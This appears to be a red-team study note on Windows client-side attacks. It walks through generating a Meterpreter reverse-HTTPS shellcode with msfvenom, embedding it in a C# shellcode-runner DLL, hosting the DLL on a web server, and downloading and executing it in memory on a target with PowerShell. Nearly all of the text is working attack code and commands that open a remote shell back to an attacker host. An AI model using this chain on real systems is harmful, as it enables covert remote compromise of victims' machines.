### Powershell

Borrowing from the work laid out in `notes/windows/client-side-attacks/wscript.md`, we leverage the same ideas, but instead of delivering `Payload.dll` with Jscript, we do so with Powershell.

We begin with generating our shellcode:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f csharp
```
We paste the output into relevant section of the following file, then save it as `InMemBundleOfJoy.cs`:
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class InMemBundleOfJoy
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
        byte[] buf = new byte[626] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8... // replace me!!
        }

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
Compile the DLL:
```bash
dotnet new classlib -n DodgyLibrary
dotnet build DodgyLibrary
mv InMemBundleOfJoy.cs DodgyLibrary
cd DodgyLibrary
csc -target:library -out:Payload.dll InMemBundleOfJoy.cs
```
Make it available via web server:
```bash
python3 -m http.server 80
```
Pull it onto the target machine and execute in memory with the following Powershell:
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.x.x/Payload.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("DodgyLibrary.InMemBundleOfJoy")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```